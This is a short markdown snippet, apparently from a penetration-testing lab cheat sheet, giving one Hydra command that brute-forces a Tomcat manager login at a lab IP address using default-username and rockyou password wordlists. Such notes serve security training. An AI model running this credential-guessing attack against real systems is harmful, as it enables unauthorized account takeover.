# Hydra
## web login form:
```
hydra -L /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt -P /usr/share/wordlists/rockyou.txt -s 8080 -f 10.129.35.106 http-get /manager/html
```



